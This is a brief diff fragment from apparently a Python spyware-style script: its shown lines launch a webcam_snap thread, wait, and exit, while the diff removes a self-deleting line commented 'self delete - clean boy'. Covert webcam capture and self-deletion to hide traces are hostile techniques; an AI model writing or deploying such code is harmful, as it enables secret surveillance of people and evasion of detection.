@@ -148,6 +148,5 @@ if __name__ == "__main__":
     Thread(target=webcam_snap).start()
     sleep(12)
     try:
-        os.remove(sys.argv[0])  # self delete - clean boy 😏
     except: pass
     sys.exit()
